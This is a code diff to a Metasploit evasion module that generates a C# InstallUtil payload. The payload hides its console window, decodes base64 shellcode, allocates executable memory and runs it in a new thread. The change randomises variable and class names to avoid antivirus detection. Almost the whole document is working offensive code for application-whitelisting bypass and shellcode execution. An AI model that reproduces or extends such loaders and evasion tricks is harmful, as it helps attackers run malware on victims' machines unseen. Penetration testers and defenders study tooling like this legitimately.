@@ -14,7 +14,7 @@ class MetasploitModule < Msf::Evasion
       },
       'Author'      =>
         [
-          'Nick Tyrer <@NickTyrer>', # For Module
+          'Nick Tyrer <@NickTyrer>', # for module development
           'Casey Smith',  # install_util bypass research
         ],
       'License'     => MSF_LICENSE,
@@ -58,17 +58,23 @@ class MetasploitModule < Msf::Evasion
 
   def install_util
     esc = build_payload
-    test = Rex::Text.rand_text_alphanumeric (8)
+    moda = Rex::Text.rand_text_alpha (3)
+    modb = Rex::Text.rand_text_alpha (3)
+    modc = Rex::Text.rand_text_alpha (3)
+    modd = Rex::Text.rand_text_alpha (3)
+    mode = Rex::Text.rand_text_alpha (3)
+    modf = Rex::Text.rand_text_alpha (3)
+    modg = Rex::Text.rand_text_alpha (3)
     <<~HEREDOC
        /*
        #{instructions}
       */
        using System;
-       namespace #{Rex::Text.rand_text_alpha 8}
+       namespace #{Rex::Text.rand_text_alpha 3}
        {
-       public class #{Rex::Text.rand_text_alphanumeric 8} { public static void Main() { } }
+       public class #{Rex::Text.rand_text_alphanumeric 3} { public static void Main() { } }
        [System.ComponentModel.RunInstaller(true)]
-       public class #{Rex::Text.rand_text_alphanumeric 8} : System.Configuration.Install.Installer
+       public class #{Rex::Text.rand_text_alphanumeric 3} : System.Configuration.Install.Installer
        {
        private static Int32 MEM_COMMIT=0x1000;
        private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;
@@ -80,23 +86,22 @@ class MetasploitModule < Msf::Evasion
        [System.Runtime.InteropServices.DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr h, UInt32 ms);
        [System.Runtime.InteropServices.DllImport("user32.dll")]
-       static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+       static extern bool ShowWindow(IntPtr #{modg}, int nCmdShow);
        [System.Runtime.InteropServices.DllImport("Kernel32")]
        private static extern IntPtr GetConsoleWindow();
-       const int SW_HIDE = 0;
-       const int SW_SHOW = 5;
+       const int #{modf} = 0;
        public override void Uninstall(System.Collections.IDictionary s)
        {
-       IntPtr hwnd;
-       hwnd = GetConsoleWindow();
-       ShowWindow(hwnd, SW_HIDE);
-       string #{test} = "#{esc}";
-       byte[] newBytes = Convert.FromBase64String(#{test});
-       byte[] sc = newBytes;
-       IntPtr m = VirtualAlloc(IntPtr.Zero, (UIntPtr)sc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-       System.Runtime.InteropServices.Marshal.Copy(sc, 0, m, sc.Length);
-       IntPtr id = IntPtr.Zero;
-       WaitForSingleObject(CreateThread(id, UIntPtr.Zero, m, id, 0, ref id), INFINITE);
+       IntPtr #{modg};
+       #{modg} = GetConsoleWindow();
+       ShowWindow(#{modg}, #{modf});
+       string #{moda} = "#{esc}";
+       byte[] #{modb} = Convert.FromBase64String(#{moda});
+       byte[] #{modc} = #{modb};
+       IntPtr #{modd} = VirtualAlloc(IntPtr.Zero, (UIntPtr)#{modc}.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+       System.Runtime.InteropServices.Marshal.Copy(#{modc}, 0, #{modd}, #{modc}.Length);
+       IntPtr #{mode} = IntPtr.Zero;
+       WaitForSingleObject(CreateThread(#{mode}, UIntPtr.Zero, #{modd}, #{mode}, 0, ref #{mode}), INFINITE);
        }
        }
        }
